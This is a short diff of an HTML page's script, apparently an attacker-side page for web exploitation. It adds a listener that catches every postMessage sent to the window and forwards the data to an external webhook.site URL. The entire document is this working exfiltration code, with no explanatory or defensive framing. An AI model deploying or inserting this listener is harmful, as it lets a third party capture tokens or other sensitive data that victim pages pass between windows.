@@ -11,8 +11,8 @@
     </div>
 
     <script>
-        
-            
+        window.addEventListener('message', function(event) {
+            console.log(event.data);
             // send to the server
             fetch('https://webhook.site/cc5c25a3-5874-4043-aaa9-329878c4a20e', {
                 method: 'POST',
@@ -21,11 +21,10 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    message: "",
-                    nav: navigator
+                    message: event.data
                 })
             });
-    
+        });
     </script>
 </body>
 </html>
